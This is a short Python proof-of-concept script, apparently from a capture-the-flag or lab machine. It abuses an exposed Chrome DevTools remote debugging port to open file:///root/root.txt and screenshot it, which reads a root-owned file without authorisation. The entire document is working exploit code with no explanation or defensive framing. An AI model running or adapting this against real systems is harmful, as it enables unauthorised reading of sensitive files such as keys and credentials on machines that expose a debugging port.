# poc.py
import json
import requests
import websocket
import base64
 
debugger_address = 'http://localhost:44351'
 
response = requests.get(f'{debugger_address}/json')
tabs = response.json()
 
web_socket_debugger_url = tabs[0]['webSocketDebuggerUrl'].replace('127.0.0.1', 'localhost')
 
print(f'Connect to url: {web_socket_debugger_url}')
 
ws = websocket.create_connection(web_socket_debugger_url, suppress_origin=True)
 
command = json.dumps({
		"id": 5,
		"method": "Target.createTarget",
		"params": {
			"url": "file:///root/root.txt"
		}
})
 
ws.send(command)
target_id = json.loads(ws.recv())['result']['targetId']
print(f'Target id: {target_id}')
 
command = json.dumps({
		"id": 5,
		"method": "Target.attachToTarget",
		"params": {
			"targetId": target_id,
			"flatten": True
		}})
		
ws.send(command)
session_id = json.loads(ws.recv())['params']['sessionId']
print(f'Session id: {session_id}')
 
command = json.dumps({
		"id": 5,
		"sessionId": session_id,
		"method": "Page.captureScreenshot",
		"params": {
			"sessionId": session_id,
			"format": "png"
		}
	})
	
ws.send(command)
result = json.loads(ws.recv())
 
ws.send(command)
result = json.loads(ws.recv())
 
if 'result' in result and 'data' in result['result']:
	print("Success file reading")
	with open("root.png", "wb") as file:
		file.write(base64.b64decode(result['result']['data']))
else:
	print("error file reading")
	
ws.close()